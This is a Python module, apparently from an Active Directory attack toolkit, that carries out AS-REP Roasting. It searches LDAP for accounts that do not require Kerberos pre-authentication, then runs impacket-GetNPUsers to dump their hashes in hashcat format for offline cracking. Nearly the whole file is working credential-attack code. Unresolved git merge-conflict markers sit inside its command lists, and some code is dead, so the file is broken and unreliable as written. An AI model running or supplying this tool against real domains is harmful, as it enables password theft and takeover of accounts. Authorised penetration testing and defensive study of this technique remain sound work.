"""AS-REP Roasting utilities using impacket-GetNPUsers logic."""

from __future__ import annotations

import logging
from typing import List, Optional, Tuple

from impacket.examples.utils import ldap_login
from impacket.krb5 import constants
from impacket.krb5.asn1 import AS_REP
from impacket.krb5.kerberosv5 import getKerberosTGT, sendReceive
from impacket.krb5.types import Principal, KerberosTime
from impacket.krb5 import asn1 as krb5_asn1
from impacket.ldap import ldapasn1
from pyasn1.codec.der import decoder, encoder
from pyasn1.type.univ import Sequence
from binascii import hexlify, unhexlify
from impacket.ntlm import compute_lmhash, compute_nthash
from datetime import datetime, timezone
import random
import struct


class ASREPRoast:
    """Find accounts with Kerberos pre-auth disabled and dump AS-REP hashes."""

    # LDAP filter for accounts that do NOT require pre-authentication
    CHECK_FILTER = (
        "(&"
        "(UserAccountControl:1.2.840.113556.1.4.803:=4194304)"
        "(!(UserAccountControl:1.2.840.113556.1.4.803:=2))"
        "(!(objectCategory=computer))"
        ")"
    )

    def __init__(
        self,
        domain: str,
        username: str,
        password: Optional[str] = None,
        hashes: Optional[str] = None,
        dc_ip: Optional[str] = None,
        request_hash: bool = True,
    ) -> None:
        self.domain = domain
        self.username = username
        self.password = password or ""
        self.request_hash = request_hash
        self.dc_ip = dc_ip

        self.lmhash = ""
        self.nthash = ""

        if hashes:
            self.lmhash, self.nthash = hashes.split(":")

        self.target = domain
        self.base_dn = ",".join(f"dc={x}" for x in domain.split("."))

    # ── LDAP enumeration ─────────────────────────────────────────────
    def _find_no_preauth_users(self) -> List[str]:
        """Return sAMAccountNames of users that don't require pre-auth."""
        ldap_conn = ldap_login(
            self.target,
            self.base_dn,
            self.dc_ip,
            None,
            False,
            self.username,
            self.password,
            self.domain,
            self.lmhash,
            self.nthash,
            None,
        )

        entries: list = []
        ldap_conn.search(
            searchFilter=self.CHECK_FILTER,
            attributes=["sAMAccountName"],
            perRecordCallback=lambda x: (
                entries.append(x) if isinstance(x, ldapasn1.SearchResultEntry) else None
            ),
        )
        ldap_conn.close()

        users: List[str] = []
        for entry in entries:
            for attr in entry["attributes"]:
                if str(attr["type"]) == "sAMAccountName":
                    users.append(str(attr["vals"][0]))
        return users

    # ── AS-REP hash request ──────────────────────────────────────────
    @staticmethod
    def _format_asrep_hash(data: bytes, username: str, domain: str) -> str:
        """Format the AS-REP encrypted part into a hashcat-compatible string."""
        decoded = decoder.decode(data, asn1Spec=AS_REP())[0]
        enc_part = decoded["enc-part"]
        etype = int(enc_part["etype"])
        cipher = enc_part["cipher"].asOctets()

        if etype == constants.EncryptionTypes.rc4_hmac.value:
            # $krb5asrep$23$user@DOMAIN:checksum$data
            checksum = cipher[:16]
            encrypted = cipher[16:]
            return (
                f"$krb5asrep$23${username}@{domain.upper()}:"
                f"{hexlify(checksum).decode()}${hexlify(encrypted).decode()}"
            )
        else:
            # Generic format for AES etc.
            return (
                f"$krb5asrep${etype}${username}@{domain.upper()}:"
                f"{hexlify(cipher).decode()}"
            )

    def _request_asrep(self, target_user: str) -> Optional[str]:
        """Send an AS-REQ without pre-auth for *target_user* and return the hash."""
        try:
            from impacket.krb5 import KerberosError
            from impacket.krb5.kerberosv5 import KerberosError as KErr
        except ImportError:
            pass

        client_name = Principal(
            target_user, type=constants.PrincipalNameType.NT_PRINCIPAL.value
        )
        as_req = krb5_asn1.AS_REQ()

        # Build the AS-REQ body
        from impacket.krb5.asn1 import seq_set, seq_set_iter
        from pyasn1.type.univ import noValue

        domain_upper = self.domain.upper()

        # Use impacket's getKerberosTGT but catch the pre-auth not required response
        # The simplest reliable approach: call sendReceive with a crafted AS-REQ
        # However, the easiest path is to use GetNPUsers' internal approach via subprocess
        import subprocess
        import shutil

        # Locate impacket-GetNPUsers (or GetNPUsers.py)
        cmd = shutil.which("impacket-GetNPUsers") or shutil.which("GetNPUsers.py")
        if cmd is None:
            # Try python -m
            cmd_parts = [
                "python",
                "-m",
                "impacket.examples.GetNPUsers",
                f"{self.domain}/{self.username}:{self.password}",
                "-dc-ip",
                self.dc_ip,
                "-request",
<<<<<<< HEAD
                "-format",
                "hashcat",
=======
                "-format", "hashcat",
>>>>>>> de5622b (added dcsync and changed kerberoasting to os command)
            ]
        else:
            cmd_parts = [
                cmd,
                f"{self.domain}/{self.username}:{self.password}",
                "-dc-ip",
                self.dc_ip,
                "-request",
<<<<<<< HEAD
                "-format",
                "hashcat",
=======
                "-format", "hashcat",
>>>>>>> de5622b (added dcsync and changed kerberoasting to os command)
            ]

        proc = subprocess.run(
            cmd_parts,
            input=target_user,
            capture_output=True,
            text=True,
            timeout=30,
        )

        for line in proc.stdout.splitlines():
            if line.startswith("$krb5asrep$"):
                return line.strip()

        if proc.stderr:
            logging.debug("GetNPUsers stderr for %s: %s", target_user, proc.stderr)

        return None

    # ── Public entry-point ───────────────────────────────────────────
    def run(self) -> List[str]:
        users = self._find_no_preauth_users()

        if not users:
            return []

        if not self.request_hash:
            return [f"{u} — Pre-auth not required" for u in users]

        results: List[str] = []
        for u in users:
            try:
                h = self._request_asrep(u)
                if h:
                    results.append(h)
                else:
                    results.append(f"{u} — hash request returned no data")
            except Exception as exc:
                logging.debug("AS-REP request failed for %s: %s", u, exc)
                results.append(f"{u} — error: {exc}")

        return results


def run_asreproast(
    *,
    domain: str,
    username: str,
    password: str,
    dc_ip: str,
    request_hash: bool,
) -> Tuple[List[str], Optional[str]]:
    """Run AS-REP Roast and return results and optional error message."""
    try:
        runner = ASREPRoast(
            domain=domain,
            username=username,
            password=password,
            dc_ip=dc_ip,
            request_hash=request_hash,
        )
        results = runner.run()
    except Exception as exc:
        logging.exception("AS-REP Roast run failed")
        return [], str(exc)

    return results, None
